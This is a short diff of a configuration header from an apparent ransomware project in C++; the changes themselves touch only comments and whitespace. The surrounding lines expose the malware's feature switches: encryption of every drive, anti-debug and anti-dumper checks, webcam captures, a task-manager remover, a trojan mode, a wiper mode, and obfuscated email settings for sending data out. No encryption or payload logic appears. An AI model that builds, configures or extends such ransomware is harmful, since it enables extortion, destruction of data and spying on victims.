@@ -49,7 +49,7 @@
 #define NUMBER_RETRIES     3	// Maximum retries for decryptor
 #define MAX_PHOTOS         3	// Maximum number of webcam captures
 
-/* enabling features */
+// Enabling features
 #define ALL_DRIVES			false	// Enable or disable the encryption of all files in every drive
 #define ANTIDEBUG			true	// Enable or disable anti-debug checker
 #define ANTI_DUMPER			true	// Enable or disable anti-dumper
@@ -83,7 +83,6 @@
 #define TROJAN				false	// Enable or disable trojan (run a real program in parallel with the ransomware)
 #define TSK_REMOVER			false	// Enable or disable remover of the task managers
 #define WIPER				false	// Enable or disable wiper instead of crypter
-
 
 // Email settings
 #define SENDERMAIL      (string)skCrypt("sender_email@gmail.com")	// Sender email address
@@ -213,8 +212,8 @@ const std::string userAgents[] = {
 }; // List of user agents
 
 
-typedef unsigned char BYTE;
 
+typedef unsigned char BYTE;
 
 // Global functions
 std::string aes_decrypt(std::string key, std::string cipher, std::string iv);
